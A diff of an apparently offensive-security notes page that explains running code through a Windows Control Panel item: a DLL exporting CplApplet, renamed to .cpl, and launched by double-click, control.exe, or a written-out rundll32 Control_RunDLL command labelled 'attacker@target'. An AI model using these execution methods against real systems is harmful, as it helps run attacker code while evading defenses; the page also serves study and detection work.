@@ -1,11 +1,15 @@
-# Executing Code in Control Panel Item through an Exported Cplapplet Function
+# Executing Code as Control Panel Item through an Exported Cplapplet Function
 
 This is a quick note that shows how to execute code in a .cpl file, which is a regular DLL file representing a Control Panel item.
 
-The .cpl file needs to export one function called CplApplet in order to be recognized by Windows as a Control Panel item.
+The .cpl file needs to export a function `CplApplet` in order to be recognized by Windows as a Control Panel item.
+
+Once the DLL is compiled and renamed to .CPL, it can simply be double clicked.
 
 ## Code
 
+{% code-tabs %}
+{% code-tabs-item title="item.cpl" %}
 ```cpp
 // dllmain.cpp : Defines the entry point for the DLL application.
 #include "stdafx.h"
@@ -42,16 +46,41 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     return TRUE;
 }
 ```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
 
-Once the CPL is compiled, we can see our exported function `Cplapplet`:
+Once the DLL is compiled, we can see our exported function `Cplapplet`:
 
 ![](../../.gitbook/assets/image%20%2844%29.png)
 
 ## Demo
 
+Below shows that double-clicking the .cpl item is enough to launch it:
+
 ![](../../.gitbook/assets/cplexecution.gif)
 
+![](../../.gitbook/assets/image%20%28201%29.png)
+
+CPL file can also be launched with `control.exe <pathtothe.cpl>` like so:
+
+![](../../.gitbook/assets/image%20%28107%29.png)
+
+or with rundll32:
+
+{% code-tabs %}
+{% code-tabs-item title="attacker@target" %}
+```text
+rundll32 shell32, Control_RunDLL \\VBOXSVR\Experiments\cpldoubleclick
+\cpldoubleclick\Debug\cpldoubleclick.cpl
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+![](../../.gitbook/assets/image%20%28146%29.png)
+
 ## References
+
+{% embed url="https://www.fireeye.com/blog/threat-research/2019/10/staying-hidden-on-the-endpoint-evading-detection-with-shellcode.html" %}
 
 {% embed url="https://github.com/fireeye/DueDLLigence/blob/master/DueDLLigence/DueDLLigence.cs" %}
 
